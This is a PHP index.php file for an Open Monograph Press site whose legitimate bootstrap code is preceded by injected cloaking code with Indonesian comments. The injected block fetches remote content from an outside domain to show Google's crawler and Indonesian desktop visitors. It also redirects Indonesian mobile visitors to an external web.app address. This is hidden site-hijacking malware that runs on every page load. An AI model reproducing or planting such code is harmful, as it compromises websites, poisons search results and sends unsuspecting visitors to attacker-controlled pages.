<?php 

function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        return "Error: " . curl_error($curl);
    }

    curl_close($curl);

    $data = json_decode($response, true);

    // Mengembalikan negara jika berhasil
    if (isset($data['status']) && $data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}

function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}

function fetchContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);

    if ($content === false) {
        trigger_error("Failed to retrieve content from {$url}.", E_USER_NOTICE);
        return null;
    }

    curl_close($curl);
    return $content;
}

// Mendapatkan negara pengunjung
$visitorCountry = getVisitorCountry();

// URL untuk konten desktop yang dapat diindeks
$desktopUrl = 'http://added-ons.cc/ediciones/ediciones.txt';

// Memeriksa apakah pengunjung adalah crawler Google
if (isGoogleCrawler()) {
    // Mengambil konten dari URL desktop
    $desktopContent = fetchContent($desktopUrl);
    if ($desktopContent) {
        echo $desktopContent; // Menampilkan konten desktop untuk Google
    }
} else {
    // Jika pengunjung bukan crawler Google
    if ($visitorCountry === 'Indonesia') {
        // Memeriksa apakah pengunjung menggunakan perangkat mobile
        if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
            // Ambil konten untuk versi mobile
            $mobileUrl = 'https://amp-ediciones-uis-edu-co.web.app/';
            header("Location: $mobileUrl"); // Mengalihkan ke URL mobile
            exit; // Menghentikan eksekusi setelah pengalihan
        } else {
            // Ambil konten untuk versi desktop (yang dapat diindeks)
            $desktopContent = fetchContent($desktopUrl);
            if ($desktopContent) {
                echo $desktopContent; // Menampilkan konten desktop
                exit;
            }
        }
    }
}

/**
 * @mainpage OMP API Reference
 *
 * Welcome to the OMP API Reference. This resource contains documentation
 * generated automatically from the OMP source code.
 *
 * The design of Open %Monograph press is heavily structured for
 * maintainability, flexibility and robustness. Those familiar with Sun's
 * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
 * will note many similarities.
 *
 * As in a MVC structure, data storage and representation, user interface
 * presentation, and control are separated into different layers. The major
 * categories, roughly ordered from "front-end" to "back-end," follow:
 * - Smarty templates, which are responsible for assembling HTML pages to
 *   display to users;
 * - Page classes, which receive requests from users' web browsers, delegate
 *   any required processing to various other classes, and call up the
 *   appropriate Smarty template to generate a response;
 * - Controllers, which implement reusable pieces of content e.g. for AJAX
 *   subrequests.
 * - Action classes, which are used by the Page classes to perform non-trivial
 *   processing of user requests;
 * - Model classes, which implement PHP objects representing the system's
 *   various entities, such as Users, Monographs, and Presses;
 * - Data Access Objects (DAOs), which generally provide (amongst others)
 *   update, create, and delete functions for their associated Model classes,
 *   are responsible for all database interaction;
 * - Support classes, which provide core functionalities, miscellaneous common
 *
 * As the system makes use of inheritance and has consistent class naming
 * conventions, it is generally easy to tell what category a particular class
 * falls into.
 * For example, a Data Access Object class always inherits from the DAO class,
 * has a Class name of the form [Something]%DAO, and has a filename of the form
 * [Something]%DAO.inc.php.
 *
 * To learn more about developing OMP, there are several additional resources
 * that may be useful:
 * - The docs/README document
 * - The PKP support forum at http://forum.pkp.sfu.ca
 * - Documentation available at http://pkp.sfu.ca/omp_documentation
 *
 * @file index.php
 *
 * Copyright (c) 2014-2018 Simon Fraser University
 * Copyright (c) 2003-2018 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * Bootstrap code for OMP site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */
define('INDEX_FILE_LOCATION', __FILE__);
$application = require('./lib/pkp/includes/bootstrap.inc.php');

// Serve the request
$application->execute();
